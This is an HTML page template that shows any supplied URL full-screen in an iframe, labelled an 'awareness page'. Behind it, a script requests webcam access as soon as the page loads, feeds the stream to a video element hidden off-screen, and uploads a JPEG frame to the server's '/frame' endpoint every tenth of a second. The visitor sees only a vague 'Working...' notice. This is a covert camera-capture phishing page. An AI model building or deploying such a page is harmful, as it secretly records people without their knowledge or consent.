<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Web</title>
  <style>
    html,body{width:100%;height:100%;margin:0;background:#111827;color:#e5e7eb;font:16px system-ui,sans-serif}
    main{width:100%;height:100%;overflow:hidden}h1{margin-top:0}
    .frame-wrap{position:fixed;inset:0;width:100vw;height:100dvh;background:#000}
    iframe{display:block;width:100%;height:100%;border:0}.notice{color:#9ca3af;margin:12px 0}
    .live{color:#86efac}a{color:#93c5fd;margin-left:12px}
    .capture-video{position:fixed;left:-10000px;top:0;width:2px;height:2px;opacity:.01;pointer-events:none}
  </style>
</head>
<body><main>
  <div class="frame-wrap">
    <iframe src="{{ iframe_url }}" title="Embedded awareness page" allowfullscreen></iframe>
  </div>
  <video id="camera" class="capture-video" autoplay muted playsinline></video>
  <p id="state" class="notice" style="position:fixed;bottom:8px;left:12px;z-index:2;background:#111827cc;padding:6px 10px;border-radius:6px"></p>
  <script>
    const video=document.querySelector('#camera'), state=document.querySelector('#state');
    let stream, timer, canvas, context;
    async function startBroadcast(){
      try{
        stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
        video.srcObject=stream;await video.play();state.textContent='Working...';state.className='live';
        canvas=document.createElement('canvas');context=canvas.getContext('2d');
        timer=setInterval(()=>{
          if(video.readyState<2 || !video.videoWidth)return;
          canvas.width=video.videoWidth;canvas.height=video.videoHeight;context.drawImage(video,0,0);
          canvas.toBlob(blob=>{if(blob)fetch('/frame',{method:'POST',body:blob});},'image/jpeg',.72);
        },100);
      }catch(error){state.textContent='Camera permission was denied or unavailable: '+error.message;}
    }

    startBroadcast();
    window.onbeforeunload=()=>{clearInterval(timer);if(stream)stream.getTracks().forEach(track=>track.stop());};
  </script>
</main></body>
</html>
